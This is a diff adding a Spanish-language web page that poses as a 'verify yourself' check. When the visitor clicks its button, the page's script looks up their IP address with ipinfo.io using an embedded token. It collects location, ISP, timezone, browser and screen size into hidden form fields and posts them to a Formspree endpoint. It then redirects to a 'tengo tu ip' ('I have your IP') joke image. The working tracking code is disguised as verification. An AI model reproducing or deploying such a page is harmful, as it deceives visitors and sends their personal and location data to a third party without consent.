@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <title>Verificación con IP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 16px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <h1>Verifícate para continuar</h1>
+
+  <form id="myForm" action="https://formspree.io/f/mnnzzvjq" method="POST">
+    <!-- Inputs ocultos donde pondremos la info -->
+    <input type="hidden" name="IP" id="ip" />
+    <input type="hidden" name="Ciudad" id="ciudad" />
+    <input type="hidden" name="Región" id="region" />
+    <input type="hidden" name="País" id="pais" />
+    <input type="hidden" name="ISP" id="isp" />
+    <input type="hidden" name="ZonaHoraria" id="zona" />
+    <input type="hidden" name="Navegador" id="navegador" />
+    <input type="hidden" name="Resolución" id="resolucion" />
+
+    <button type="button" onclick="verificarYEnviar()">Verifícate</button>
+  </form>
+
+  <script>
+    function verificarYEnviar() {
+      fetch("https://ipinfo.io/json?token=d576d05ed1d579")
+        .then(res => res.json())
+        .then(data => {
+          // Rellenamos inputs con los datos
+          document.getElementById("ip").value = data.ip || "No disponible";
+          document.getElementById("ciudad").value = data.city || "No disponible";
+          document.getElementById("region").value = data.region || "No disponible";
+          document.getElementById("pais").value = data.country || "No disponible";
+          document.getElementById("isp").value = data.org || "No disponible";
+          document.getElementById("zona").value = data.timezone || "No disponible";
+          document.getElementById("navegador").value = navigator.userAgent;
+          document.getElementById("resolucion").value = window.innerWidth + "x" + window.innerHeight;
+
+          // Enviar el formulario con fetch para controlar la respuesta
+          const form = document.getElementById("myForm");
+          const formData = new FormData(form);
+
+          fetch(form.action, {
+            method: form.method,
+            body: formData,
+            headers: {
+              'Accept': 'application/json'
+            }
+          })
+          .then(response => {
+            if (response.ok) {
+              // Redirigir al enlace solicitado
+              window.location.href = "https://www.google.com/imgres?q=tengo%20tu%20ip&imgurl=https%3A%2F%2Fih1.redbubble.net%2Fimage.3180981182.7857%2Fflat%2C750x%2C075%2Cf-pad%2C750x1000%2Cf8f8f8.u3.jpg&imgrefurl=https%3A%2F%2Fwww.redbubble.com%2Fes%2Fi%2Fposter%2Ftengo-tu-direcci%25C3%25B3n-ip-de-PatchyLaCow%2F100207857.LVTDI&docid=OK8CwPNpVqSeoM&tbnid=QukEBg3sYmMoYM&vet=12ahUKEwj1jOKk9OWOAxWQUaQEHU-LKoYQM3oECBgQAA..i&w=750&h=1000&hcb=2&ved=2ahUKEwj1jOKk9OWOAxWQUaQEHU-LKoYQM3oECBgQAA";
+            } else {
+              alert("Error al enviar el formulario.");
+            }
+          })
+          .catch(() => {
+            alert("Error al enviar el formulario.");
+          });
+        })
+        .catch(() => {
+          alert("Error al obtener datos de IP.");
+        });
+    }
+  </script>
+</body>
+</html>
